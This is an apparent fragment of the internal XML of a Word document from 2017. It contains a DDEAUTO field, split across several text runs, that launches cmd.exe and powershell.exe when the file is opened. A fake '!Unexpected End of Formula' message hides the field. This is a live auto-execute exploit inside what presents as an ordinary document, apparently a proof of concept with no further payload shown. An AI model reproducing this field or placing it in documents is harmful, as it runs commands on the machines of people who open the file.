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33" w:rsidRPr="008E4058" w:rsidRDefault="00EF51F7" w:rsidP="008E4058">
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> DDEAUTO c:\\win</w:instrText>
      </w:r>
      <w:r w:rsidR="009F6377">
        <w:instrText>dows\\system32\\cmd.exe "/k powershell</w:instrText>
      </w:r>
      <w:r>
        <w:instrText>.exe</w:instrText>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E4058">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>!Unexpected End of Formula</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00027A33" w:rsidRPr="008E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DF"/>
    <w:rsid w:val="00027A33"/>
    <w:rsid w:val="003B7BA9"/>
    <w:rsid w:val="003C0F51"/>
    <w:rsid w:val="008E4058"/>
    <w:rsid w:val="009140DF"/>
    <w:rsid w:val="009B7ED3"/>
    <w:rsid w:val="009F6377"/>
    <w:rsid w:val="00B01194"/>
    <w:rsid w:val="00BA77F2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1549"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{B02FFAA2-03A4-4907-8B9C-A6D8075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F3C4B3C8.dotm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Penning, Nicholas</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Penning, Nicholas</cp:lastModifiedBy>
  <cp:revision>9</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-10-23T13:46:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-10-23T15:09:00Z</dcterms:modified>
</cp:coreProperties>
</file>